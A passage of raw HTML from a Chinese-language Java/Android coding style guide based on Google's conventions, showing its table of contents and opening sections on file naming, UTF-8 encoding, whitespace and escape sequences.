style="margin-left: 0.58in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc1041621069">2.3.1 <font face="&#23435;&#20307;"><span lang="zh-CN">&#31354;&#30333;&#23383;&#31526;</a></span></font><a href="#_Toc1041621069"></a></p><p style="margin-left: 0.58in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc130588539">2.3.2 <font face="&#23435;&#20307;"><span lang="zh-CN">&#29305;&#27530;&#36716;&#20041;&#24207;&#21015;</a></span></font><a href="#_Toc130588539"></a></p><p style="margin-left: 0.58in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc716119009">2.3.3 <font face="&#23435;&#20307;"><span lang="zh-CN">&#38750;</a></span></font><a href="#_Toc716119009">ASCII<font face="&#23435;&#20307;"><span lang="zh-CN">&#23383;&#31526;</a></span></font><a href="#_Toc716119009"></a></p><p style="margin-bottom: 0in; line-height: 100%"><a href="#_Toc387838118">3.<font face="&#23435;&#20307;"><span lang="zh-CN">&#28304;&#25991;&#20214;&#32467;&#26500;</a></span></font><a href="#_Toc387838118"></a></p><p style="margin-left: 0.29in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc885294832">3.1 <font face="&#23435;&#20307;"><span lang="zh-CN">&#35768;&#21487;&#35777;&#25110;&#29256;&#26435;&#20449;&#24687;</a></span></font><a href="#_Toc885294832"></a></p><p style="margin-left: 0.29in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc1717148839">3.2 package<font face="&#23435;&#20307;"><span lang="zh-CN">&#35821;&#21477;</a></span></font><a href="#_Toc1717148839"></a></p><p style="margin-left: 0.29in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc973320510">3.3 import<font face="&#23435;&#20307;"><span lang="zh-CN">&#35821;&#21477;</a></span></font><a href="#_Toc973320510"></a></p><p style="margin-left: 0.58in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc185671533">3.3.1 import<font face="&#23435;&#20307;"><span lang="zh-CN">&#19981;&#35201;&#20351;&#29992;&#36890;&#37197;&#31526;</a></span></font><a href="#_Toc185671533"></a></p><p style="margin-left: 0.58in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc85248011">3.3.2 <font face="&#23435;&#20307;"><span lang="zh-CN">&#19981;&#35201;&#25442;&#34892;</a></span></font><a href="#_Toc85248011"></a></p><p style="margin-left: 0.58in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc352726969">3.3.3 <font face="&#23435;&#20307;"><span lang="zh-CN">&#39034;&#24207;&#21644;&#38388;&#36317;</a></span></font><a href="#_Toc352726969"></a></p><p style="margin-left: 0.29in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc1727990124">3.4 <font face="&#23435;&#20307;"><span lang="zh-CN">&#31867;&#22768;&#26126;</a></span></font><a href="#_Toc1727990124"></a></p><p style="margin-left: 0.58in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc1042619565">3.4.1 <font face="&#23435;&#20307;"><span lang="zh-CN">&#21482;&#26377;&#19968;&#20010;&#39030;&#32423;</a></span></font><a href="#_Toc1042619565"></a></p><p style="margin-left: 0.58in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc1260026007">3.4.2 <font face="&#23435;&#20307;"><span lang="zh-CN">&#31867;&#25104;&#21592;&#39034;&#24207;</a></span></font><a href="#_Toc1260026007"></a></p><p style="margin-bottom: 0in; line-height: 100%"><a href="#_Toc1340232007">4.<font face="&#23435;&#20307;"><span lang="zh-CN">&#26684;&#24335;&#26415;&#35821;</a></span></font><a href="#_Toc1340232007"></a></p><p style="margin-left: 0.29in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc1910447657">4.1 <font face="&#23435;&#20307;"><span lang="zh-CN">&#22823;&#25324;&#21495;</a></span></font><a href="#_Toc1910447657"></a></p><p style="margin-left: 0.58in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc170728268">4.1.1 <font face="&#23435;&#20307;"><span lang="zh-CN">&#20351;&#29992;&#22823;&#25324;&#21495;</a></span></font><a href="#_Toc170728268">(<font face="&#23435;&#20307;"><span lang="zh-CN">&#21363;&#20351;&#26159;&#21487;&#36873;&#30340;</a></span></font><a href="#_Toc170728268">)</a></p><p style="margin-left: 0.58in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc360888106">4.1.2 <font face="&#23435;&#20307;"><span lang="zh-CN">&#38750;&#31354;&#22359;&#65306;</a></span></font><a href="#_Toc360888106">K&amp; R <font face="&#23435;&#20307;"><span lang="zh-CN">&#39118;&#26684;</a></span></font><a href="#_Toc360888106"></a></p><p style="margin-left: 0.58in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc1493656653">4.1.3 <font face="&#23435;&#20307;"><span lang="zh-CN">&#31354;&#22359;&#65306;&#21487;&#20197;&#29992;&#31616;&#27905;&#29256;&#26412;</a></span></font><a href="#_Toc1493656653"></a></p><p style="margin-left: 0.29in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc1071128681">4.2 <font face="&#23435;&#20307;"><span lang="zh-CN">&#22359;&#32553;&#36827;&#65306;</a></span></font><a href="#_Toc1071128681">4<font face="&#23435;&#20307;"><span lang="zh-CN">&#20010;&#31354;&#26684;</a></span></font><a href="#_Toc1071128681"></a></p><p style="margin-left: 0.29in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc1176425987">4.3 <font face="&#23435;&#20307;"><span lang="zh-CN">&#19968;&#34892;&#19968;&#20010;&#35821;&#21477;</a></span></font><a href="#_Toc1176425987"></a></p><p style="margin-left: 0.29in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc1944456457">4.4 <font face="&#23435;&#20307;"><span lang="zh-CN">&#21015;&#38480;&#21046;&#65306;</a></span></font><a href="#_Toc1944456457">80<font face="&#23435;&#20307;"><span lang="zh-CN">&#25110;</a></span></font><a href="#_Toc1944456457">100</a></p><p style="margin-left: 0.29in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc1196052324">4.5 <font face="&#23435;&#20307;"><span lang="zh-CN">&#33258;&#21160;&#25442;&#34892;</a></span></font><a href="#_Toc1196052324"></a></p><p style="margin-left: 0.58in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc53450303">4.5.1 <font face="&#23435;&#20307;"><span lang="zh-CN">&#20174;&#21738;&#37324;&#26029;&#24320;</a></span></font><a href="#_Toc53450303"></a></p><p style="margin-left: 0.58in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc495977564">4.5.2 <font face="&#23435;&#20307;"><span lang="zh-CN">&#33258;&#21160;&#25442;&#34892;&#26102;&#32553;&#36827;&#33267;&#23569;</a></span></font><a href="#_Toc495977564">+8<font face="&#23435;&#20307;"><span lang="zh-CN">&#20010;&#31354;&#26684;</a></span></font><a href="#_Toc495977564"></a></p><p style="margin-left: 0.29in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc46436563">4.6 <font face="&#23435;&#20307;"><span lang="zh-CN">&#31354;&#30333;</a></span></font><a href="#_Toc46436563"></a></p><p style="margin-left: 0.58in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc957349860">4.6.1 <font face="&#23435;&#20307;"><span lang="zh-CN">&#22402;&#30452;&#31354;&#30333;</a></span></font><a href="#_Toc957349860"></a></p><p style="margin-left: 0.58in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc1844432375">4.6.2 <font face="&#23435;&#20307;"><span lang="zh-CN">&#27700;&#24179;&#31354;&#30333;</a></span></font><a href="#_Toc1844432375"></a></p><p style="margin-left: 0.58in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc474829803">4.6.3 <font face="&#23435;&#20307;"><span lang="zh-CN">&#27700;&#24179;&#23545;&#40784;&#65306;&#19981;&#20570;&#35201;&#27714;</a></span></font><a href="#_Toc474829803"></a></p><p style="margin-left: 0.29in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc1872255370">4.7 <font face="&#23435;&#20307;"><span lang="zh-CN">&#29992;&#23567;&#25324;&#21495;&#26469;&#38480;&#23450;&#32452;&#65306;&#25512;&#33616;</a></span></font><a href="#_Toc1872255370"></a></p><p style="margin-left: 0.29in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc2001949432">4.8 <font face="&#23435;&#20307;"><span lang="zh-CN">&#20855;&#20307;&#32467;&#26500;</a></span></font><a href="#_Toc2001949432"></a></p><p style="margin-left: 0.58in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc2078751231">4.8.1 <font face="&#23435;&#20307;"><span lang="zh-CN">&#26522;&#20030;&#31867;</a></span></font><a href="#_Toc2078751231"></a></p><p style="margin-left: 0.58in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc766392792">4.8.2 <font face="&#23435;&#20307;"><span lang="zh-CN">&#21464;&#37327;&#22768;&#26126;</a></span></font><a href="#_Toc766392792"></a></p><p style="margin-left: 0.58in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc2132537971">4.8.3 <font face="&#23435;&#20307;"><span lang="zh-CN">&#25968;&#32452;</a></span></font><a href="#_Toc2132537971"></a></p><p style="margin-left: 0.58in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc647386592">4.8.4 switch<font face="&#23435;&#20307;"><span lang="zh-CN">&#35821;&#21477;</a></span></font><a href="#_Toc647386592"></a></p><p style="margin-left: 0.58in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc1154230910">4.8.5 <font face="&#23435;&#20307;"><span lang="zh-CN">&#27880;&#35299;</a></span></font><a href="#_Toc1154230910">(Annotations)</a></p><p style="margin-left: 0.58in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc870349156">4.8.6 <font face="&#23435;&#20307;"><span lang="zh-CN">&#27880;&#37322;</a></span></font><a href="#_Toc870349156"></a></p><p style="margin-left: 0.58in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc217051783">4.8.7 Modifiers</a></p><p style="margin-bottom: 0in; line-height: 100%"><a href="#_Toc2127551420">5.<font face="&#23435;&#20307;"><span lang="zh-CN">&#21629;&#21517;&#32422;&#23450;</a></span></font><a href="#_Toc2127551420"></a></p><p style="margin-left: 0.29in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc1056020689">5.1 <font face="&#23435;&#20307;"><span lang="zh-CN">&#23545;&#25152;&#26377;&#26631;&#35782;&#31526;&#37117;&#36890;&#29992;&#30340;&#35268;&#21017;</a></span></font><a href="#_Toc1056020689"></a></p><p style="margin-left: 0.29in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc302299795">5.2 <font face="&#23435;&#20307;"><span lang="zh-CN">&#26631;&#35782;&#31526;&#31867;&#22411;&#30340;&#35268;&#21017;</a></span></font><a href="#_Toc302299795"></a></p><p style="margin-left: 0.58in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc332794742">5.2.1 <font face="&#23435;&#20307;"><span lang="zh-CN">&#21253;&#21517;</a></span></font><a href="#_Toc332794742"></a></p><p style="margin-left: 0.58in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc636527165">5.2.2 <font face="&#23435;&#20307;"><span lang="zh-CN">&#31867;&#21517;</a></span></font><a href="#_Toc636527165"></a></p><p style="margin-left: 0.58in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc1344919360">5.2.3 <font face="&#23435;&#20307;"><span lang="zh-CN">&#26041;&#27861;&#21517;</a></span></font><a href="#_Toc1344919360"></a></p><p style="margin-left: 0.58in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc1592820749">5.2.4 <font face="&#23435;&#20307;"><span lang="zh-CN">&#24120;&#37327;&#21517;</a></span></font><a href="#_Toc1592820749"></a></p><p style="margin-left: 0.58in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc1976759172">5.2.5 <font face="&#23435;&#20307;"><span lang="zh-CN">&#38750;&#24120;&#37327;&#23383;&#27573;&#21517;</a></span></font><a href="#_Toc1976759172"></a></p><p style="margin-left: 0.58in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc1107883369">5.2.6 <font face="&#23435;&#20307;"><span lang="zh-CN">&#21442;&#25968;&#21517;</a></span></font><a href="#_Toc1107883369"></a></p><p style="margin-left: 0.58in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc1763549018">5.2.7 <font face="&#23435;&#20307;"><span lang="zh-CN">&#23616;&#37096;&#21464;&#37327;&#21517;</a></span></font><a href="#_Toc1763549018"></a></p><p style="margin-left: 0.58in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc190163631">5.2.8 <font face="&#23435;&#20307;"><span lang="zh-CN">&#31867;&#22411;&#21464;&#37327;&#21517;</a></span></font><a href="#_Toc190163631"></a></p><p style="margin-left: 0.58in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc454056374">5.2.9 <font face="&#23435;&#20307;"><span lang="zh-CN">&#36164;&#28304;&#25991;&#20214;&#21629;&#21517;&#35268;&#33539;</a></span></font><a href="#_Toc454056374"></a></p><p style="margin-bottom: 0in; line-height: 100%"><a href="#_Toc687194051">6.<font face="&#23435;&#20307;"><span lang="zh-CN">&#32534;&#31243;&#23454;&#36341;</a></span></font><a href="#_Toc687194051"></a></p><p style="margin-left: 0.29in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc1366589618">6.1 @Override<font face="&#23435;&#20307;"><span lang="zh-CN">&#65306;&#33021;&#29992;&#21017;&#29992;</a></span></font><a href="#_Toc1366589618"></a></p><p style="margin-left: 0.29in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc251029183">6.2 <font face="&#23435;&#20307;"><span lang="zh-CN">&#25429;&#33719;&#30340;&#24322;&#24120;&#65306;&#19981;&#33021;&#24573;&#35270;</a></span></font><a href="#_Toc251029183"></a></p><p style="margin-left: 0.29in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc1883246375">6.3 <font face="&#23435;&#20307;"><span lang="zh-CN">&#38745;&#24577;&#25104;&#21592;&#65306;&#20351;&#29992;&#31867;&#36827;&#34892;&#35843;&#29992;</a></span></font><a href="#_Toc1883246375"></a></p><p style="margin-left: 0.29in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc1420039921">6.4 Finalizers: <font face="&#23435;&#20307;"><span lang="zh-CN">&#31105;&#29992;</a></span></font><a href="#_Toc1420039921"></a></p><p style="margin-bottom: 0in; line-height: 100%"><a href="#_Toc747006748">7.Javadoc</a></p><p style="margin-left: 0.29in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc1929682938">7.1 <font face="&#23435;&#20307;"><span lang="zh-CN">&#26684;&#24335;</a></span></font><a href="#_Toc1929682938"></a></p><p style="margin-left: 0.58in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc229906133">7.1.1 <font face="&#23435;&#20307;"><span lang="zh-CN">&#19968;&#33324;&#24418;&#24335;</a></span></font><a href="#_Toc229906133"></a></p><p style="margin-left: 0.58in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc443955475">7.1.2 <font face="&#23435;&#20307;"><span lang="zh-CN">&#27573;&#33853;</a></span></font><a href="#_Toc443955475"></a></p><p style="margin-left: 0.58in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc257029093">7.1.3 Javadoc<font face="&#23435;&#20307;"><span lang="zh-CN">&#26631;&#35760;</a></span></font><a href="#_Toc257029093"></a></p><p style="margin-left: 0.29in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc2102161504">7.2 <font face="&#23435;&#20307;"><span lang="zh-CN">&#25688;&#35201;&#29255;&#27573;</a></span></font><a href="#_Toc2102161504"></a></p><p style="margin-left: 0.29in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc298421259">7.3 <font face="&#23435;&#20307;"><span lang="zh-CN">&#21738;&#37324;&#38656;&#35201;&#20351;&#29992;</a></span></font><a href="#_Toc298421259">Javadoc</a></p><p style="margin-left: 0.58in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc188296676">7.3.1 <font face="&#23435;&#20307;"><span lang="zh-CN">&#20363;&#22806;&#65306;&#19981;&#35328;&#33258;&#26126;&#30340;&#26041;&#27861;</a></span></font><a href="#_Toc188296676"></a></p><p style="margin-left: 0.58in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc721070648">7.3.2 <font face="&#23435;&#20307;"><span lang="zh-CN">&#20363;&#22806;&#65306;&#37325;&#36733;</a></span></font><a href="#_Toc721070648"></a></p><p style="margin-left: 0.58in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc283475582">7.3.3 <font face="&#23435;&#20307;"><span lang="zh-CN">&#21487;&#36873;&#30340;</a></span></font><a href="#_Toc283475582">Javadoc</a></p><p style="margin-bottom: 0in; line-height: 100%"><font face="&#23435;&#20307;"><span lang="zh-CN"><a href="#_Toc835683268">&#38468;&#24405;&#65306;</a></span></font><a href="#_Toc835683268"></a></p><p class="western" style="margin-bottom: 0in; line-height: 100%"><br/></p></div><h1 class="western" style="widows: 2; orphans: 2; page-break-before: always"><a name="_Toc997867887"></a>1. <font face="&#23435;&#20307;"><span lang="zh-CN">&#21069;&#35328;</span></font></h1><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#36825;&#20221;&#25991;&#26723;&#21442;&#32771;&#20102;</span></font></font><font size="3" style="font-size: 12pt"><a href="http://google-styleguide.googlecode.com/svn/trunk/javaguide.html">GoogleJava </a></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN"><a href="http://google-styleguide.googlecode.com/svn/trunk/javaguide.html">&#32534;&#31243;&#39118;&#26684;&#35268;&#33539;</a>&#21644;</span></font></font><font size="3" style="font-size: 12pt"><a href="http://www.360sdn.com/2013/android_0517/144.html">Google</a></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN"><a href="http://www.360sdn.com/2013/android_0517/144.html">&#23448;&#26041;</a></span></font></font><font size="3" style="font-size: 12pt"><a href="http://www.360sdn.com/2013/android_0517/144.html">Android</a></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN"><a href="http://www.360sdn.com/2013/android_0517/144.html">&#32534;&#30721;&#39118;&#26684;&#35268;&#33539;</a>&#12290;&#35813;&#25991;&#26723;&#20165;&#20379;&#21442;&#32771;&#65292;&#21482;&#35201;&#24418;&#25104;&#19968;&#20010;&#32479;&#19968;&#30340;&#39118;&#26684;&#65292;&#35265;&#37327;&#30693;&#20854;&#24847;&#23601;&#21487;&#12290;</span></font></font></p><h2 class="western" style="widows: 2; orphans: 2"><a name="_Toc903899557"></a>1.1 <font face="&#23435;&#20307;"><span lang="zh-CN">&#26415;&#35821;&#35828;&#26126;</span></font></h2><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#22312;&#26412;&#25991;&#26723;&#20013;&#65292;&#38500;&#38750;&#21478;&#26377;&#35828;&#26126;&#65306;</span></font></font></p><ol><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#26415;&#35821;</span></font>class <font face="&#23435;&#20307;"><span lang="zh-CN">&#21487;&#34920;&#31034;&#19968;&#20010;&#26222;&#36890;&#31867;&#65292;&#26522;&#20030;&#31867;&#65292;&#25509;&#21475;&#25110;&#26159;</span></font>annotation<font face="&#23435;&#20307;"><span lang="zh-CN">&#31867;&#22411;</span></font>(@interface)</p><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#26415;&#35821;</span></font>comment <font face="&#23435;&#20307;"><span lang="zh-CN">&#21482;&#29992;&#26469;&#25351;&#20195;&#23454;&#29616;&#30340;&#27880;&#37322;</span></font>(implementationcomments)<font face="&#23435;&#20307;"><span lang="zh-CN">&#65292;&#25105;&#20204;&#19981;&#20351;&#29992;</span></font>&quot;documentationcomments&quot;<font face="&#23435;&#20307;"><span lang="zh-CN">&#19968;&#35789;&#65292;&#32780;&#26159;&#29992;</span></font>Javadoc<font face="&#23435;&#20307;"><span lang="zh-CN">&#12290;&#20854;&#20182;&#30340;&#26415;&#35821;&#35828;&#26126;&#20250;&#20598;&#23572;&#22312;&#21518;&#38754;&#30340;&#25991;&#26723;&#20986;&#29616;&#12290;</span></font></p></ol><h2 class="western" style="widows: 2; orphans: 2"><a name="_Toc1348454810"></a>1.2 <font face="&#23435;&#20307;"><span lang="zh-CN">&#25351;&#21335;&#35828;&#26126;&#26412;&#25991;&#26723;&#20013;&#30340;&#31034;&#20363;&#20195;&#30721;&#24182;&#19981;&#20316;&#20026;&#35268;&#33539;&#65292;&#20165;&#20379;&#21442;&#32771;&#12290;</span></font></h2><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#22522;&#26412;&#26684;&#24335;&#26041;&#38754;&#20351;&#29992;</span></font></font><font size="3" style="font-size: 12pt">AndroidStudio</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#40664;&#35748;&#27169;&#26495;&#21363;&#21487;&#65288;&#20351;&#29992;&#26684;&#24335;&#21270;&#24555;&#25463;&#38190;&#22788;&#29702;&#21518;&#22522;&#26412;&#31526;&#21512;&#65289;&#12290;</span></font></font></p><h1 class="western" style="widows: 2; orphans: 2"><a name="_Toc428393240"></a>2. <font face="&#23435;&#20307;"><span lang="zh-CN">&#28304;&#25991;&#20214;&#22522;&#30784;</span></font></h1><h2 class="western" style="widows: 2; orphans: 2"><a name="_Toc914905510"></a>2.1 <font face="&#23435;&#20307;"><span lang="zh-CN">&#25991;&#20214;&#21517;</span></font></h2><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#28304;&#25991;&#20214;&#20197;&#20854;&#26368;&#39030;&#23618;&#30340;&#31867;&#21517;&#26469;&#21629;&#21517;&#65292;&#22823;&#23567;&#20889;&#25935;&#24863;&#65292;&#25991;&#20214;&#25193;&#23637;&#21517;&#20026;</span></font></font><font size="3" style="font-size: 12pt">.java</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#12290;</span></font></font></p><h2 class="western" style="widows: 2; orphans: 2"><a name="_Toc157517057"></a>2.2 <font face="&#23435;&#20307;"><span lang="zh-CN">&#25991;&#20214;&#32534;&#30721;&#65306;</span></font>UTF-8</h2><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#28304;&#25991;&#20214;&#32534;&#30721;&#26684;&#24335;&#20026;</span></font></font><font size="3" style="font-size: 12pt">UTF-8</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#12290;</span></font></font></p><h2 class="western" style="widows: 2; orphans: 2"><a name="_Toc1603921428"></a>2.3 <font face="&#23435;&#20307;"><span lang="zh-CN">&#29305;&#27530;&#23383;&#31526;</span></font></h2><h3 class="western" style="widows: 2; orphans: 2"><a name="_Toc1041621069"></a>2.3.1 <font face="&#23435;&#20307;"><span lang="zh-CN">&#31354;&#30333;&#23383;&#31526;</span></font></h3><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#38500;&#20102;&#34892;&#32467;&#26463;&#31526;&#24207;&#21015;&#65292;</span></font></font><font size="3" style="font-size: 12pt">ASCII</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#27700;&#24179;&#31354;&#26684;&#23383;&#31526;</span></font></font><font size="3" style="font-size: 12pt">(0x20</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65292;&#21363;&#31354;&#26684;</span></font></font><font size="3" style="font-size: 12pt">)</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#26159;&#28304;&#25991;&#20214;&#20013;&#21807;&#19968;&#20801;&#35768;&#20986;&#29616;&#30340;&#31354;&#30333;&#23383;&#31526;&#65292;&#36825;&#24847;&#21619;&#30528;&#65306;</span></font></font></p><ol><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#25152;&#26377;&#20854;&#23427;&#23383;&#31526;&#20018;&#20013;&#30340;&#31354;&#30333;&#23383;&#31526;&#37117;&#35201;&#36827;&#34892;&#36716;&#20041;&#12290;</span></font></p><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#21046;&#34920;&#31526;&#19981;&#29992;&#20110;&#32553;&#36827;&#65288;&#21487;&#20197;&#22312;</span></font>IDE<font face="&#23435;&#20307;"><span lang="zh-CN">&#20013;</span></font>Tab<font face="&#23435;&#20307;"><span lang="zh-CN">&#38190;&#35774;&#32622;&#20026;&#33509;&#24178;&#20010;&#31354;&#26684;&#65289;&#12290;</span></font></p></ol><h3 class="western" style="widows: 2; orphans: 2"><a name="_Toc130588539"></a>2.3.2 <font face="&#23435;&#20307;"><span lang="zh-CN">&#29305;&#27530;&#36716;&#20041;&#24207;&#21015;</span></font></h3><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#23545;&#20110;&#20855;&#26377;&#29305;&#27530;&#36716;&#20041;&#24207;&#21015;&#30340;&#20219;&#20309;&#23383;&#31526;</span></font></font><font size="3" style="font-size: 12pt">(\b,\t, \n, \f, \r, \&quot;,\'</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#21450;</span></font></font><font size="3" style="font-size: 12pt">)</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65292;&#25105;&#20204;&#20351;&#29992;&#23427;&#30340;&#36716;&#20041;&#24207;&#21015;&#65292;&#32780;&#19981;&#26159;&#30456;&#24212;&#30340;&#20843;&#36827;&#21046;</span></font></font><font size="3" style="font-size: 12pt">(</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#27604;&#22914;</span></font></font><font size="3" style="font-size: 12pt">\012)</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#25110;</span></font></font><font size="3" style="font-size: 12pt">Unicode(</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#27604;&#22914;</span></font></font><font size="3" style="font-size: 12pt">\u000a)</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#36716;&#20041;&#12290;</span></font></font></p><h3 class="western" style="widows: 2; orphans: 2"><a name="_Toc716119009"></a>2.3.3 <font face="&#23435;&#20307;"><span lang="zh-CN">&#38750;</span></font>ASCII<font face="&#23435;&#20307;"><span lang="zh-CN">&#23383;&#31526;</span></font></h3><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#23545;&#20110;&#21097;&#20313;&#30340;&#38750;</span></font></font><font size="3" style="font-size: 12pt">ASCII</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#23383;&#31526;&#65292;&#26159;&#20351;&#29992;&#23454;&#38469;&#30340;</span></font></font><font size="3" style="font-size: 12pt">Unicode</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#23383;&#31526;</span></font></font><font size="3" style="font-size: 12pt">(</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#27604;&#22914;&infin;</span></font></font><font size="3" style="font-size: 12pt">)</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65292;&#36824;&#26159;&#20351;&#29992;&#31561;&#20215;&#30340;</span></font></font><font size="3" style="font-size: 12pt">Unicode</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#36716;&#20041;&#31526;</span></font></font><font size="3" style="font-size: 12pt">(</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#27604;&#22914;</span></font></font><font size="3" style="font-size: 12pt">\u221e)</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65292;&#21462;&#20915;&#20110;&#21738;&#20010;&#33021;&#35753;&#20195;&#30721;&#26356;&#26131;&#20110;&#38405;&#35835;&#21644;&#29702;&#35299;&#12290;</span></font></font></p><p align="left" style="margin-left: 0.5in; margin-right: 0.5in; margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">Tip:</font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#22312;&#20351;&#29992;</span></font></font><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">Unicode</font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span 